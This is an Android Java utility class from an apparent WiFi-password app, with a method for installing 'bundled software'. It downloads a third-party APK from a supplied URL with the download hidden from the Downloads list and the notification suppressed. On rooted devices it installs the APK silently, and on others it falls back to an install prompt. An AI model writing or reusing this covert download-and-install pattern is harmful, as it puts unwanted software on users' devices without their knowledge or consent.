package cn.hudun.wifi.pwd.utils;

import android.app.DownloadManager;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.net.Uri;
import android.os.Environment;
import android.util.Log;

import java.io.File;
import java.util.List;

/**
 * Auth: Joe
 * Date: 2015-05-13
 * Time: 11:04
 * FIXME
 */
public class DownloadUtil {
    /**
     * @param context   上下文 
     * @param packageName 捆绑软件包名
     * @param fileName    存储sd卡的文件名
     * @param url         下载的连接地址
     */
    public static void autoDown(Context context, String packageName, String fileName, String url) {
        Log.i("autoDown",context+"");
        Log.i("autoDown",packageName+"");
        Log.i("autoDown",fileName+"");
    	List<PackageInfo> infos = context.getPackageManager().getInstalledPackages(0);
        boolean isInstalled = false;
        for (PackageInfo info : infos) {
            if (info.packageName.equals(packageName)) {
                isInstalled = true;
                break;
            }
        }
        if (!isInstalled) {
            File file = new File(Environment.getExternalStorageDirectory() + "/" + Environment.DIRECTORY_DOWNLOADS + "/" + fileName);
            if (!file.exists()) {
            	Log.i("autoDown","exists");
                downLoad(context.getApplicationContext(), url,fileName);
            } else {
            	Log.i("autoDown","file");
                install(file, context);
            }
        }
    }


    /**
     * @param context
     * @param url
     */
    private static void downLoad(Context context, String url,String fileName) {
        DownloadManager manager = (DownloadManager) context.getSystemService(Context.DOWNLOAD_SERVICE);
        DownloadManager.Request down = new DownloadManager.Request(Uri.parse(url));
        down.setAllowedNetworkTypes(DownloadManager.Request.NETWORK_WIFI);
        down.setVisibleInDownloadsUi(false);
        down.setShowRunningNotification(false);
        down.setDestinationInExternalPublicDir(Environment.DIRECTORY_DOWNLOADS, fileName);
        manager.enqueue(down);
    }

    private static void install(final File file, Context context) {
        if (Root.isRoot()) {
            new Runnable() {
                @Override
                public void run() {
                    SlientInstall.installSilent(Uri.fromFile(file).getPath());
                }
            }.run();

        } else {
            Intent intent = new Intent(Intent.ACTION_VIEW);
            intent.setDataAndType(Uri.fromFile(file), "application/vnd.android.package-archive");
            context.startActivity(intent);
        }
    }
}
